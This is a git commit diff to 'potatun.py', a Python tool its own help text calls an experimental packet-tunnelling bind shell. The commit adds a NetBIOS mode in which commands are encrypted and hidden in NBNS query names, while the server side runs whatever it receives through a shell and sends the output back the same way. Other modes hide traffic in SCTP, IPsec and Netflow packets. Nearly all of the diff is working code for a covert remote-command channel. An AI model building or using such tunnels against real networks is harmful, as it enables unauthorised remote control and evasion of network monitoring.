8cbd25f6cf04588b2e1729b9bdf68f54b632411c
Potato-Industries <56988989+Potato-Industries@users.noreply.github.com>
2019-12-16 11:36:52 +0000

    added netbios, plus some cleanup

--- potatun.py
+++ potatun.py
@@ -2,7 +2,6 @@
 
 from __future__ import unicode_literals, print_function
 from prompt_toolkit import PromptSession, HTML, print_formatted_text as print
-from prompt_toolkit.completion import WordCompleter
 from prompt_toolkit.styles import Style
 from prompt_toolkit.shortcuts import ProgressBar
 
@@ -11,7 +10,6 @@ from Crypto.Cipher import ARC2
 import os
 import base64
 import time
-import random
 import datetime
 import hashlib
 import argparse
@@ -50,7 +48,7 @@ def listenICMP(intface):
   return decrypt(data[len(data)-1][Raw].load).decode('utf-8')
 
 def throwSCTP(cmd, ip, port, intface):
-  data = IP(dst=ip)/SCTP(sport=random.randint(50000,60000), dport=int(port))/SCTPChunkData(data=encrypt(cmd))
+  data = IP(dst=ip)/SCTP(sport=RandNum(50000,60000), dport=int(port))/SCTPChunkData(data=encrypt(cmd))
   send(data, iface=str(intface), verbose=True)
 
 def stopSCTP(x):
@@ -113,7 +111,7 @@ def throwIPSEC(cmd, ip, port, intface):
   dt = datetime.today()
   key = hashlib.sha1((str(dt.year) + str(dt.month) + str(dt.day)).encode('utf-8')).hexdigest()
   sa = SecurityAssociation(ESP, spi=0xc0ffeffe, crypt_algo='AES-CBC', crypt_key=key[-16:].encode('ISO-8859-1'))
-  p = IP(Raw(IP(dst=ip)/TCP(sport=random.randint(50000,60000), dport=int(port))/Raw(cmd)))
+  p = IP(Raw(IP(dst=ip)/TCP(sport=RandNum(50000,60000), dport=int(port))/Raw(cmd)))
   data = sa.encrypt(p)
   send(data, iface=str(intface), verbose=True)
 
@@ -137,12 +135,12 @@ def throwNETFLOW(cmd, ip, port, intface):
   cmds = [cmd[i:i+10] for i in range(0, len(cmd), 10)]
   with ProgressBar(title="Sending Netflow..") as pb:
     for cmd in pb(cmds):
-      base = IP(dst=ip)/UDP(sport=random.randint(50000,60000), dport=2055)/NetflowHeader(version=5)/NetflowHeaderV5(count=len(cmd))
+      base = IP(dst=ip)/UDP(sport=RandNum(50000,60000), dport=2055)/NetflowHeader(version=5)/NetflowHeaderV5(count=len(cmd))
       for i in cmd:
         base /= NetflowRecordV5(srcport=60000+ord(i), dstport=443, src=RandIP(), dst=RandIP(), dpkts=RandInt())
       send(base, iface=str(intface), verbose=False)
   
-  base = IP(dst=ip)/UDP(sport=random.randint(50000,60000), dport=2055)/NetflowHeader(version=5)/NetflowHeaderV5(count=1)
+  base = IP(dst=ip)/UDP(sport=RandNum(50000,60000), dport=2055)/NetflowHeader(version=5)/NetflowHeaderV5(count=1)
   base /= NetflowRecordV5(srcport=59999, dstport=443, src=RandIP(), dst=RandIP(), dpkts=RandInt())
   send(base, iface=str(intface), verbose=False)
 
@@ -166,6 +164,38 @@ def listenNETFLOW(intface, port):
         o = o + str(chr(pkt[NetflowHeaderV5][i+1].srcport - 60000))
 
   return str(o)
+
+def throwNETBIOS(cmd, ip, port, intface):
+  cmd = encrypt(cmd)
+  cmds = [cmd[i:i+15] for i in range(0, len(cmd), 15)]
+  with ProgressBar(title="Sending Netbios..") as pb:
+    for cmd in pb(cmds):
+      base = IP(dst=ip)/UDP(sport=137, dport=137)/NBNSQueryRequest(QUESTION_NAME=cmd)
+      send(base, iface=str(intface), verbose=False)
+  
+  base = IP(dst=ip)/UDP(sport=137, dport=137)/NBNSQueryRequest(QUESTION_NAME="BAMNBAMN")
+  send(base, iface=str(intface), verbose=False)
+
+def stopNETBIOS(x):
+  if UDP in x and NBNSQueryRequest in x:
+    if x[NBNSQueryRequest].QUESTION_NAME.strip(b' ') == b"BAMNBAMN":
+      return True
+    else:
+      return False
+  else:
+    return False
+
+def listenNETBIOS(intface, port):
+  pkts = sniff(iface=intface, filter="inbound and udp and dst port 137", stop_filter=stopNETBIOS)
+  o = b''
+  for pkt in pkts:
+    if UDP in pkt and NBNSQueryRequest in pkt:
+      if pkt[NBNSQueryRequest].QUESTION_NAME.strip(b' ') == b"BAMNBAMN":
+        break
+      else:
+        o = o + pkt[NBNSQueryRequest].QUESTION_NAME.strip(b' ')
+
+  return decrypt(o).decode('utf-8')
 
 def main(intface, ip, port, mode):
   session = PromptSession()
@@ -295,11 +325,31 @@ def main(intface, ip, port, mode):
       time.sleep(2)
       throwNETFLOW(data, ip, port, intface)
 
+  elif mode == "netbios-c":
+    while True:
+      try:
+        cmd = session.prompt('# ', style=our_style)
+        throwNETBIOS(cmd, ip, port, intface)
+        print(HTML("<ansired><b>" + listenNETBIOS(intface, port) + "</b></ansired>"))
+        time.sleep(2)
+      except KeyboardInterrupt:
+        break
+      except EOFError:
+        break
+    print('Exiting..')
+
+  elif mode == "netbios-s":
+    while True:
+      cmd = listenNETBIOS(intface, port)
+      data = shellExec(cmd)
+      time.sleep(2)
+      throwNETBIOS(data, ip, port, intface)
+
 if __name__ == "__main__":
   parser = argparse.ArgumentParser(description='potatun - an experimental packet tunnelling bind shell.')
   parser.add_argument('-i', type=str, help='send interface (eth0)')
   parser.add_argument('-t', type=str, help='send ip:port (10.10.10.1:443)')
-  parser.add_argument('-m', type=str, help='tunnel mode (udp-c/udp-s, tcp-c/tcp-s, icmp-c/icmp-s, sctp-c/sctp-s, ipsec-c/ipsec-s, netflow-c/netflow-s)')
+  parser.add_argument('-m', type=str, help='tunnel mode (udp-c/udp-s, tcp-c/tcp-s, icmp-c/icmp-s, sctp-c/sctp-s, ipsec-c/ipsec-s, netflow-c/netflow-s, netbios-c/netbios-s)')
   args = parser.parse_args()
   if args.i and args.t and args.m:
     print("> Sending/Listening on: " + args.i)
